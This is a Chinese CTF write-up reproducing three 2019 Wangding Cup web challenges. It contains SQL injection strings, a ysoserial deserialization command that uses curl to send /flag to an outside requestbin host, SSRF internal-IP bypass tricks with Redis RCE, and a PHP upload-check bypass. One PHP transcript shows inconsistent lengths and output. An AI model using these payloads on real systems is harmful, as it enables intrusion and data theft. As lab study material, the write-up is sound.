# 网鼎杯2019 其他组复现

## Think Java

```
jdbc:mysql://localhost:3306/数据库名?user=用户名&password=密码&useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT
```

存在注入点

```
myapp#' union select database()#;
myapp#' union select pwd from user#;
myapp#' union select name from user#;
myapp?useUnicode=true'union/**/select/**/group_concat(pwd)from(user)#
```

可以得到用户名``admin``密码``admin@Rrrr_ctf_asde``

访问登录路由可以得到

```json
{
	"data":"Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu",
	"msg":"登录成功",
	"status":2,
	"timestamps":1602227051479
}
```

>下方的特征可以作为序列化的标志参考:
>一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。
>或者如果以aced开头，那么他就是这一段Java序列化的16进制。
>https://www.cnblogs.com/20175211lyz/p/13412945.html


利用Burp Suite的插件Java Deserialization Scanner可以测试到ROME类型的反序列化

生成payload打一打

```
java -jar ysoserial.jar ROME "curl http://http.requestbin.buuoj.cn/snc3wasn -d @/flag" |base64 -w 0
```

## SSRFMe 玄武组

首先是绕过内网IP检测

```php
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
}
```

这里的``gethostbyname``会把hostname转换成ipv4地址

一些绕过的方法

- linux下 0.0.0.0 => 127.0.0.1

- http://foo@127.0.0.1:80@www.google.com/hint.php

- DNS Rebinding

- ip 地址的一些变形

  - 127。0。0。1
  - 127.1
  - 0177.0.0x0001 ``8进制 16进制等``
  - [::1] >>> 127.0.0.1
  - [::]  >>>  0.0.0.0
  - `NULL` php的libcurl


这里比较好用的是``0.0.0.0``

然后内网访问``hint.php``可以得到redis的密码

这里利用redis-ssrf工具来进行下一步的渗透

在buuoj vps启动``rogue-server``

在本机利用``ssrf-redis``生成对应gopher的payload

执行后可以RCE

### 参考资料

浅析Redis中SSRF的利用 ：https://xz.aliyun.com/t/5665?accounttraceid=4422b0ffd5f4417194e0e2764df02a04tmev
Redis-ssrf : https://github.com/xmsec/redis-ssrf

## Faka

tk.sql 里可以找到后台的管理员账号密码

```
INSERT INTO `system_user` VALUES (10005,'admin','81c47be5dc6110d5087dd4af8dc56552',NULL,'12345678@qq.com','12345678','demo',264,'2020-03-20 14:38:56',1,'3',0,NULL,'2018-05-02 00:40:09',NULL);
```

代码审计，已经拿到后台了，看看有无RCE或者文件上传的点
全局搜索upload,可以看到在``application/admin/controller/Plugs.php``处有

```php
    public function upload()
    {
        $file = $this->request->file('file');//filename也可控
        $ext = strtolower(pathinfo($file->getInfo('name'), 4));
        $md5 = str_split($this->request->post('md5'), 16);//注意这里的md5是我们可控的 以十六位一组，进行切片，之后分别将这两组字符串作为路径和文件名，最后在加上之前得到的文件扩展名赋值给$filename
        $filename = join('/', $md5) . ".{$ext}";
        if (strtolower($ext) == 'php' || !in_array($ext, explode(',', strtolower(sysconf('storage_local_exts'))))) {
            return json(['code' => 'ERROR', 'msg' => '文件上传类型受限']);
        }//md5可控，我们可以让生成的文件名后缀为.php绕过此处限制
        // 文件上传Token验证
        if ($this->request->post('token') !== md5($filename . session_id())) {
            return json(['code' => 'ERROR', 'msg' => '文件上传验证失败']);
        }
        // 文件上传处理
        if (($info = $file->move('static' . DS . 'upload' . DS . $md5[0], $md5[1], true))) {
            if (($site_url = FileService::getFileUrl($filename, 'local'))) {
                return json(['data' => ['site_url' => $site_url], 'code' => 'SUCCESS', 'msg' => '文件上传成功']);
            }
        }
        return json(['code' => 'ERROR', 'msg' => '文件上传失败']);
    }
```

可以看到``file()``对文件进行了封装，跟踪看到

```php
    /**
     * 获取上传的文件信息
     * @access public
     * @param string|array $name 名称
     * @return null|array|\think\File
     */
    public function file($name = '')
    {
        if (empty($this->file)) {
            $this->file = isset($_FILES) ? $_FILES : [];
        }
        if (is_array($name)) {
            return $this->file = array_merge($this->file, $name);
        }
        $files = $this->file;
        if (!empty($files)) {
            // 处理上传文件
            $array = [];
            foreach ($files as $key => $file) {
                if (is_array($file['name'])) {
                    $item  = [];
                    $keys  = array_keys($file);
                    $count = count($file['name']);
                    for ($i = 0; $i < $count; $i++) {
                        if (empty($file['tmp_name'][$i]) || !is_file($file['tmp_name'][$i])) {
                            continue;
                        }
                        $temp['key'] = $key;
                        foreach ($keys as $_key) {
                            $temp[$_key] = $file[$_key][$i];
                        }
                        $item[] = (new File($temp['tmp_name']))->setUploadInfo($temp);
                    }
                    $array[$key] = $item;
                } else {
                    if ($file instanceof File) {
                        $array[$key] = $file;
                    } else {
                        if (empty($file['tmp_name']) || !is_file($file['tmp_name'])) {
                            continue;
                        }
                        $array[$key] = (new File($file['tmp_name']))->setUploadInfo($file);
                    }
                }
            }
            if (strpos($name, '.')) {
                list($name, $sub) = explode('.', $name);
            }
            if ('' === $name) {
                // 获取全部文件
                return $array;
            } elseif (isset($sub) && isset($array[$name][$sub])) {
                return $array[$name][$sub];
            } elseif (isset($array[$name])) {
                return $array[$name];
            }
        }
        return;
    }
```

``move``函数完成上传

```php
    /**
     * 移动文件
     * @access public
     * @param  string      $path     保存路径 这里是 'static' . DS . 'upload' . DS . $md5[0]
     * @param  string|bool $savename 保存的文件名 默认自动生成  这里是 $md5[1]
     * @param  boolean     $replace  同名文件是否覆盖
     * @return false|File
     */
    public function move($path, $savename = true, $replace = true)
    {
        // 文件上传失败，捕获错误代码
        if (!empty($this->info['error'])) {
            $this->error($this->info['error']);
            return false;
        }

        // 检测合法性
        if (!$this->isValid()) {
            $this->error = 'upload illegal files';
            return false;
        }

        // 验证上传
        if (!$this->check()) {
            return false;
        }

        $path = rtrim($path, DS) . DS;
        // 文件保存命名规则
        $saveName = $this->buildSaveName($savename);
        $filename = $path . $saveName;

        // 检测目录
        if (false === $this->checkPath(dirname($filename))) {
            return false;
        }

        // 不覆盖同名文件
        if (!$replace && is_file($filename)) {
            $this->error = ['has the same filename: {:filename}', ['filename' => $filename]];
            return false;
        }

        /* 移动文件 */
        if ($this->isTest) {
            rename($this->filename, $filename);
        } elseif (!move_uploaded_file($this->filename, $filename)) {
            $this->error = 'upload write error';
            return false;
        }

        // 返回 File 对象实例
        $file = new self($filename);
        $file->setSaveName($saveName)->setUploadInfo($this->info);

        return $file;
    }
```

```php
❯ php -a
Interactive mode enabled

php > echo md5("test");
098f6bcd4621d373cade4e832627b4f6
php > $md5 = str_split("098f6bcd4621d373cade4e832627b4f6",16);
php > var_dump($md5);
array(2) {
  [0]=>
  string(16) "098f6bcd4621d373"
  [1]=>
  string(16) "cade4e832627b4f6"
}
php > $md5[1] = substr($md5[1],0,12).'.php';
php > var_dump($md5);
array(2) {
  [0]=>
  string(16) "098f6bcd4621d373"
  [1]=>
  string(20) "cade4e832627.php"
}
php > var_dump(join('/', $md5)."php");
string(37) "098f6bcd4621d373/cade4e832627.php.png";
php > var_dump(md5(join('/', $md5)."php"));
string(32) "1f027bdf029d54fa4e97a14a2180b428"
```

令``token = 1f027bdf029d54fa4e97a14a2180b428 & md5 =098f6bcd4621d373cade4e832627.php``就可以使上传文件后缀为``php``了

### 参考资料
